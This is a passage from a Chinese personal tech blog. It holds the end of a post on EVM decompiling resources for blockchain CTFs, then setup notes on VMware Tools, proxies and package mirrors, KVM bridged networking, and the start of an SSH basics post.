<p>有些题目不会提供源码, 只提供Ethereum Virtual Machine(EVM)的字节码, 因此需要进行一次<strong>反编译</strong>操作.</p>
<p>今年(2020)强网杯有一道区块链的题目[4]是基于<code>IPFS</code>. 貌似是一种基于区块链的文件系统.</p>
<h2 id="常用资源"><a href="#常用资源" class="headerlink" title="常用资源"></a>常用资源</h2><h3 id="evm-逆向"><a href="#evm-逆向" class="headerlink" title="evm 逆向"></a>evm 逆向</h3><p>本节内容主要参考[5].</p>
<p>反编译工具:</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://github.com/crytic/ida-evm">IDA-EVM(2018年最后一次更新)</a></li>
<li><a target="_blank" rel="noopener" href="https://ethervm.io/decompile">ethervm.io(在线反编译)</a></li>
</ol>
<p>查手册:</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://solidity-cn.readthedocs.io/zh/develop/">solidity手册</a></li>
<li><a target="_blank" rel="noopener" href="https://ethervm.io/#opcodes">EVM opcode</a></li>
</ol>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><blockquote>
<p>所以”智能合约”的”智能”是体现在哪儿的呢</p>
</blockquote>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Vt411X7JF">区块链技术与应用-肖臻</a></li>
<li><a target="_blank" rel="noopener" href="https://medium.com/@mvmurthy/ethereum-for-web-developers-890be23d1d0c">Ethereum for web developers</a></li>
<li><a target="_blank" rel="noopener" href="https://hitcxy.com/">cxy学长的博客(区块链大佬orz)</a></li>
<li><a target="_blank" rel="noopener" href="https://hitcxy.com/2020/qwb2020/#IPFS">强网杯2020-IPFS</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2927">智能合约逆向初探-先知社区</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/09/30/2020-09-30-10-vm-basics/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/20255635">
      <meta itemprop="name" content="wxk1997">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wxk1997's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/30/2020-09-30-10-vm-basics/" class="post-title-link" itemprop="url">虚拟机相关操作记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-09-30 00:00:00" itemprop="dateCreated datePublished" datetime="2020-09-30T00:00:00+08:00">2020-09-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-11-08 10:25:02" itemprop="dateModified" datetime="2020-11-08T10:25:02+08:00">2020-11-08</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>记录一些安装虚拟机过程中遇到的问题, 便于再次用到时查阅.</p>
<h2 id="1-1-更新历史"><a href="#1-1-更新历史" class="headerlink" title="1.1. 更新历史"></a>1.1. 更新历史</h2><table>
<thead>
<tr>
<th>更新时间</th>
<th>更新内容</th>
</tr>
</thead>
<tbody><tr>
<td>2020-09-30</td>
<td>初稿</td>
</tr>
<tr>
<td>2020-10-04</td>
<td>npm使用淘宝源</td>
</tr>
<tr>
<td>2020-10-07</td>
<td>编译tmux</td>
</tr>
<tr>
<td>2020-11-07</td>
<td>github clone 加速器</td>
</tr>
<tr>
<td>2020-11-08</td>
<td>pypi清华源使用方法</td>
</tr>
</tbody></table>
<h1 id="2-正文"><a href="#2-正文" class="headerlink" title="2. 正文"></a>2. 正文</h1><h2 id="2-1-vmware-相关"><a href="#2-1-vmware-相关" class="headerlink" title="2.1. vmware 相关"></a>2.1. vmware 相关</h2><h3 id="2-1-1-重新安装vmware-tools-选项灰色解决方案"><a href="#2-1-1-重新安装vmware-tools-选项灰色解决方案" class="headerlink" title="2.1.1. 重新安装vmware tools 选项灰色解决方案"></a>2.1.1. <code>重新安装vmware tools</code> 选项灰色解决方案</h3><p>先关机</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo shutdown now </span><br></pre></td></tr></table></figure>

<p>然后如下操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">虚拟机-&gt;设置-&gt;CD&#x2F;DVD-&gt;使用物理驱动器 &amp;&amp; 自动检测</span><br></pre></td></tr></table></figure>

<p>具体步骤参考[1]</p>
<p><strong><em>上面这种方法可能失败, 还可以使用下面这种方法</em></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">虚拟机-&gt;设置-&gt;CD&#x2F;DVD-&gt;使用ISO镜像文件(选择vmware安装文件夹下的 VMware Workstation\linux.iso)</span><br></pre></td></tr></table></figure>

<p>然后将<code>cdrom</code>连接到虚拟机上(右下角有光盘图标)</p>
<h3 id="2-1-2-server-版安装-vmware-tools"><a href="#2-1-2-server-版安装-vmware-tools" class="headerlink" title="2.1.2. server 版安装 vmware tools"></a>2.1.2. server 版安装 vmware tools</h3><p>参考[2]</p>
<p>首先保证 包含<code>vmware tools</code>的镜像(VMware Workstation\linux.iso)连接到虚拟机中. 设备名通常为 <code>/dev/cdrom</code></p>
<p>我们先将<code>cdrom</code>挂载到文件系统中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir &#x2F;mnt&#x2F;cdrom</span><br><span class="line">mount &#x2F;dev&#x2F;cdrom &#x2F;mnt&#x2F;cdrom</span><br></pre></td></tr></table></figure>

<p>然后将<code>vmware tools</code>安装包拷贝出来, 并<code>umount</code> 挂载文件夹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;mnt&#x2F;cdrom&#x2F;VMwareTools-10.3.21-14772444.tar.gz ~&#x2F;</span><br><span class="line">umount &#x2F;mnt&#x2F;cdrom</span><br></pre></td></tr></table></figure>

<p>最后解压安装即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">tar xvf .&#x2F;VMwareTools-10.3.21-14772444.tar.gz</span><br><span class="line">cd vmware-tools-distrib</span><br><span class="line">.&#x2F;vmware-install.pl -d</span><br></pre></td></tr></table></figure>

<h3 id="2-1-3-共享文件夹相关"><a href="#2-1-3-共享文件夹相关" class="headerlink" title="2.1.3. 共享文件夹相关"></a>2.1.3. 共享文件夹相关</h3><p>手动挂载共享文件夹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vmhgfs-fuse .host:&#x2F; &#x2F;mnt&#x2F;hgfs -o allow_other</span><br></pre></td></tr></table></figure>

<h2 id="2-2-virtual-box-相关"><a href="#2-2-virtual-box-相关" class="headerlink" title="2.2. virtual box 相关"></a>2.2. virtual box 相关</h2><p>todo</p>
<h2 id="2-3-ubuntu-相关"><a href="#2-3-ubuntu-相关" class="headerlink" title="2.3. ubuntu 相关"></a>2.3. ubuntu 相关</h2><h3 id="2-3-1-安装ruby"><a href="#2-3-1-安装ruby" class="headerlink" title="2.3.1. 安装ruby"></a>2.3.1. 安装ruby</h3><p><code>ruby</code> 有多个版本, <code>ubuntu 16.04</code> 默认用 <code>apt</code> 安装的 <code>ruby</code> 可能版本较低, 无法安装 <code>seccomp-tools</code> 等工具, 因此需要想办法安装高版本的 <code>ruby</code>.</p>
<p>具体命令如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-add-repository ppa:brightbox&#x2F;ruby-ng </span><br><span class="line">sudo apt install ruby2.7 ruby2.7-dev</span><br></pre></td></tr></table></figure>

<p>[4]中提到了另一种方式, 使用 <code>snap</code>. 但是在 <code>ubuntu 16.04.7</code> 上安装成功之后并不能执行<code>ruby</code>, 不清楚具体原因.</p>
<h3 id="2-3-2-各种代理设置"><a href="#2-3-2-各种代理设置" class="headerlink" title="2.3.2. 各种代理设置"></a>2.3.2. 各种代理设置</h3><p>全局代理, 参考[3].</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim ~&#x2F;.zshrc</span><br><span class="line">export proxy&#x3D;&quot;socks5:&#x2F;&#x2F;host:port&quot;</span><br><span class="line">export http_proxy&#x3D;$proxy</span><br><span class="line">export https_proxy&#x3D;$proxy</span><br><span class="line">export ftp_proxy&#x3D;$proxy</span><br></pre></td></tr></table></figure>

<h4 id="2-3-2-1-github"><a href="#2-3-2-1-github" class="headerlink" title="2.3.2.1. github"></a>2.3.2.1. github</h4><p>设置http代理:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy http:&#x2F;&#x2F;host:port &amp;&amp;\</span><br><span class="line">git config --global https.proxy https:&#x2F;&#x2F;host:port</span><br></pre></td></tr></table></figure>

<p>设置socks5代理:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy &#39;socks5:&#x2F;&#x2F;host:port&#39; &amp;&amp; \</span><br><span class="line">git config --global https.proxy &#39;socks5:&#x2F;&#x2F;host:port&#39;</span><br></pre></td></tr></table></figure>

<p>查看设置结果:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global --get-all http.proxy &amp;&amp; \</span><br><span class="line">git config --global --get-all https.proxy</span><br></pre></td></tr></table></figure>

<p>取消代理:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global --unset http.proxy &amp;&amp;\</span><br><span class="line">git config --global --unset https.proxy</span><br></pre></td></tr></table></figure>

<p>使用clone加速器(感谢航神推荐orz):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">github.com.cnpmjs.org</span><br><span class="line">gitclone.com</span><br></pre></td></tr></table></figure>

<p>使用方法很简单, clone的时候替换掉 <code>github.com</code>即可.</p>
<h4 id="2-3-2-2-pip"><a href="#2-3-2-2-pip" class="headerlink" title="2.3.2.2. pip"></a>2.3.2.2. pip</h4><p><em>建议使用阿里云/清华的源</em></p>
<p>设置代理:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt --proxy&#x3D;代理服务器IP:端口号</span><br></pre></td></tr></table></figure>

<p>使用阿里云源:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/.pip</span><br><span class="line">cat &gt; ~/.pip/pip.conf &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[global]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">trusted-host=mirrors.aliyun.com</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">index-url=http://mirrors.aliyun.com/pypi/simple/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>

<p>临时安装使用阿里云的源:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pwntools</span><br></pre></td></tr></table></figure>


<p>清华源使用参考: </p>
<p><a target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/help/pypi/">pypi 镜像使用帮助 - 清华大学开源软件镜像站</a></p>
<p>临时使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple some-package</span><br></pre></td></tr></table></figure>

<p>设为默认:</p>
<p>升级 pip 到最新的版本 (&gt;=10.0.0) 后进行配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pip -U</span><br><span class="line">pip config set global.index-url https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple</span><br></pre></td></tr></table></figure>

<p>如果您到 pip 默认源的网络连接较差，临时使用本镜像站来升级 pip：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple pip -U</span><br></pre></td></tr></table></figure>

<h4 id="2-3-2-3-Anaconda"><a href="#2-3-2-3-Anaconda" class="headerlink" title="2.3.2.3. Anaconda"></a>2.3.2.3. Anaconda</h4><p>详见<a target="_blank" rel="noopener" href="https://pullp.github.io/2020/08/13/3-Anaconda_cheetsheet/#%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86">Anaconda常用操作#设置代理</a></p>
<h4 id="2-3-2-4-npm"><a href="#2-3-2-4-npm" class="headerlink" title="2.3.2.4. npm"></a>2.3.2.4. npm</h4><p>使用淘宝源:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 临时</span></span><br><span class="line">npm install 软件名 --registry https://registry.npm.taobao.org </span><br><span class="line"><span class="comment">#永久</span></span><br><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br><span class="line"><span class="comment">#验证</span></span><br><span class="line">npm config get registry</span><br></pre></td></tr></table></figure>

<h4 id="2-3-2-5-docker"><a href="#2-3-2-5-docker" class="headerlink" title="2.3.2.5. docker"></a>2.3.2.5. docker</h4><p>安装:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io  </span><br></pre></td></tr></table></figure>

<p>使用阿里云加速参考: <a target="_blank" rel="noopener" href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors</a></p>
<h3 id="2-3-3-编译相关"><a href="#2-3-3-编译相关" class="headerlink" title="2.3.3. 编译相关"></a>2.3.3. 编译相关</h3><h4 id="2-3-3-1-编译-tmux"><a href="#2-3-3-1-编译-tmux" class="headerlink" title="2.3.3.1. 编译 tmux"></a>2.3.3.1. 编译 tmux</h4><p>官方仓库: <a target="_blank" rel="noopener" href="https://github.com/tmux/tmux">https://github.com/tmux/tmux</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/tmux/tmux.git</span><br><span class="line"><span class="built_in">cd</span> tmux</span><br><span class="line">sh autogen.sh</span><br><span class="line">./configure &amp;&amp; make</span><br></pre></td></tr></table></figure>

<p>需要安装一些依赖</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libevent-dev ncurses-dev -y</span><br></pre></td></tr></table></figure>

<h3 id="更新相关"><a href="#更新相关" class="headerlink" title="更新相关"></a>更新相关</h3><p>一条指令更新+升级(来自航神orz)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update &amp;&amp; apt upgrade -y &amp;&amp; apt dist-upgrade -y &amp;&amp; apt clean -y &amp;&amp; apt autoclean -y &amp;&amp; apt remove -y &amp;&amp; apt autoremove -y</span><br></pre></td></tr></table></figure>

<h1 id="3-结语"><a href="#3-结语" class="headerlink" title="3. 结语"></a>3. 结语</h1><blockquote>
<p>“这个<code>wsl</code>就是逊啦. 动不动就出bug, 快照功能也没有.”</p>
</blockquote>
<h1 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h1><ol>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41913844/article/details/84327042">解决虚拟机VMWareTools图标灰色问题</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/KKSoft/p/7765195.html">在Ubuntu Server 16.04 LTS下安装VMware Tools</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/EasonJim/p/9826681.html">Linux/CentOS设置全局代理（http）</a></li>
<li><a target="_blank" rel="noopener" href="https://askubuntu.com/questions/1175693/how-to-upgrade-ruby-to-version-2-4-4-on-ubuntu-16-04-for-wpscan">如何在ubuntu 16.04中安装ruby&gt;=2.4.4</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/09/16/2020-09-16-9-kvm-basics/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/20255635">
      <meta itemprop="name" content="wxk1997">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wxk1997's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/16/2020-09-16-9-kvm-basics/" class="post-title-link" itemprop="url">kvm 常用操作</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-09-16 00:00:00 / 修改时间：16:31:37" itemprop="dateCreated datePublished" datetime="2020-09-16T00:00:00+08:00">2020-09-16</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>最近开始参与一个导师的项目, 我们是乙方, 给甲方做一个流量分析相关的系统. 整个系统是运行在一个kvm虚拟机(系统为centos)里面. 系统配置好之后将整个虚拟机打包成镜像提供给甲方. </p>
<p>我的任务是系统中的一个日志相关的小模块, 开发的第一步自然是搭建环境, 由于是第一次接触kvm虚拟机, 在搭建的过程中也踩了一些坑, 因此觉得有必要记录一下, 方便之后再次使用时查阅.</p>
<h1 id="2-正文"><a href="#2-正文" class="headerlink" title="2. 正文"></a>2. 正文</h1><h2 id="2-1-kvm-常用操作"><a href="#2-1-kvm-常用操作" class="headerlink" title="2.1. kvm 常用操作"></a>2.1. kvm 常用操作</h2><p>todo</p>
<h2 id="2-2-kvm-从镜像到可联网的虚拟机"><a href="#2-2-kvm-从镜像到可联网的虚拟机" class="headerlink" title="2.2. kvm 从镜像到可联网的虚拟机"></a>2.2. kvm 从镜像到可联网的虚拟机</h2><p>host环境配置:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu 18.04 Desktop</span><br></pre></td></tr></table></figure>


<h3 id="2-2-1-从镜像到虚拟机"><a href="#2-2-1-从镜像到虚拟机" class="headerlink" title="2.2.1. 从镜像到虚拟机"></a>2.2.1. 从镜像到虚拟机</h3><p>最开始学长给我的就是一个虚拟机镜像文件, 我需要用这个镜像启动一个虚拟机. 镜像文件格式如下.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ file ./centos7.6</span><br><span class="line">./centos7.6: QEMU QCOW Image (v3), 12884901888 bytes</span><br><span class="line">$ du -h ./centos7.6</span><br><span class="line">13G     ./centos7.6</span><br></pre></td></tr></table></figure>

<p><code>qcow</code> 是一种虚拟机镜像格式, 常见的虚拟机镜像格式有<code>raw</code>, <code>qcow</code>, <code>qcow2</code>, <code>vmdk</code> 等, 具体信息参考[1]</p>
<p>从镜像启动虚拟机建议使用 <code>virt-manager</code>, 一个虚拟机管理工具.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install virt-manager</span><br></pre></td></tr></table></figure>

<p><strong><em>这个工具有<code>gui</code> 和 <code>cli</code> 两种形式, 本文介绍使用<code>gui</code>从镜像构造虚拟机的过程.</em></strong></p>
<p>安装完毕之后启动<code>virt-manager</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ virt-manager</span><br></pre></td></tr></table></figure>

<p>会弹出一个gui界面. 之后操作就和 windows 下使用 vmware 创建虚拟机差不多. 大致流程如下, 不再赘述.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File -&gt; New Virtual Machine -&gt; Import existing disk image -&gt; 内存&#x2F;处理器&#x2F;网卡等操作(之后都可以修改)</span><br></pre></td></tr></table></figure>

<p>一通设置完毕之后就可以启动虚拟机了. 会弹出一个新的窗口, 里面就是虚拟机的终端/桌面.</p>
<p>不过现在的虚拟机还无法连接外网, 在配置的过程中如果需要安装各种依赖包的话还是比较麻烦, 接下来就讲一下如何配置虚拟机的网络使其可以连上外网.  </p>
<h3 id="2-2-2-使虚拟机连上外网"><a href="#2-2-2-使虚拟机连上外网" class="headerlink" title="2.2.2. 使虚拟机连上外网"></a>2.2.2. 使虚拟机连上外网</h3><p>配置思路大致如下:</p>
<ol>
<li>新建一个网桥</li>
<li>将虚拟机的网卡桥接到第一步新建的网桥上</li>
</ol>
<p>ubuntu 18.04上使用<code>netplan</code>[1]来配置网络, 我们通过配置文件添加一个网桥 <code>br0</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml</span><br><span class="line"># Let NetworkManager manage all devices on this system</span><br><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: NetworkManager</span><br><span class="line">  ethernets:</span><br><span class="line">    eno1:</span><br><span class="line">      dhcp4: no</span><br><span class="line">  bridges:</span><br><span class="line">    br0:</span><br><span class="line">      interfaces: [eno1]</span><br><span class="line">      dhcp4: no</span><br><span class="line">      addresses: [192.168.3.2&#x2F;24]</span><br><span class="line">      gateway4: 192.168.3.1</span><br><span class="line">$ sudo netplan apply</span><br><span class="line">$ sudo service networking restart</span><br></pre></td></tr></table></figure>

<p><strong><em>ip和接口名称自行修改</em></strong></p>
<p>虽然在系统中添加了网桥，但是此时在<code>virt-manager</code>中是看不到我们添加的网桥的，还需要在<code>virsh</code>中添加一个网桥配置。</p>
<p>新建一个xml文件 <code>br0.xml</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">network</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">name</span>&gt;</span>kvm-br0<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">forward</span> <span class="attr">mode</span>=<span class="string">&quot;bridge&quot;</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">name</span>=<span class="string">&quot;br0&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">network</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后执行如下命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">virsh net-define br0.xml</span><br><span class="line">virsh net-start kvm-bridge</span><br><span class="line">virsh net-autostart kvm-bridge</span><br></pre></td></tr></table></figure>

<p>再设置虚拟机使用 <code>kvm-br0</code> 这个网卡, 并使用ifconfig 配置个静态ip即可成功访问外网</p>
<h1 id="3-结语"><a href="#3-结语" class="headerlink" title="3. 结语"></a>3. 结语</h1><blockquote>
<p>写代码5分钟, 配环境半小时</p>
</blockquote>
<h1 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h1><ol>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/pansaky/article/details/91868885">KVM qcow2、raw、vmdk等镜像格式和转换</a></li>
<li><a target="_blank" rel="noopener" href="https://netplan.io/">Netplan 官网</a></li>
<li><a target="_blank" rel="noopener" href="https://notesail.com/posts/kvm-bridge.html">Ubuntu18 kvm单网卡桥接</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/09/13/2020-09-13-8-ssh-basics/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/20255635">
      <meta itemprop="name" content="wxk1997">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wxk1997's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/13/2020-09-13-8-ssh-basics/" class="post-title-link" itemprop="url">ssh 常用操作</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-09-13 00:00:00" itemprop="dateCreated datePublished" datetime="2020-09-13T00:00:00+08:00">2020-09-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-09-24 10:26:47" itemprop="dateModified" datetime="2020-09-24T10:26:47+08:00">2020-09-24</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><h2 id="1-1-更新历史"><a href="#1-1-更新历史" class="headerlink" title="1.1. 更新历史"></a>1.1. 更新历史</h2><table>
<thead>
<tr>
<th>更新时间</th>
<th>更新内容</th>
</tr>
</thead>
<tbody><tr>
<td>2020-09-13</td>
<td>初稿</td>
</tr>
<tr>
<td>2020-09-18</td>
<td>启用密钥登录; 使用ssh_config;</td>
</tr>
</tbody></table>
<p>最近新装了一台ubuntu, 照例又是配置各种环境. 在配置ssh的时候遇到很多操作都不记得具体步骤, 又得从网上查怎么操作. 因此觉得有必要记录一下ssh的一些常用操作, 方便下次再配置ssh时进行查阅.</p>
<h1 id="2-正文"><a href="#2-正文" class="headerlink" title="2. 正文"></a>2. 正文</h1><h2 id="2-1-生成密钥对"><a href="#2-1-生成密钥对" class="headerlink" title="2.1. 生成密钥对"></a>2.1. 生成密钥对</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure>

<p>私钥路径: <code>~/.ssh/id_rsa</code><br>公钥路径: <code>~/.ssh/id_rsa.pub</code></p>
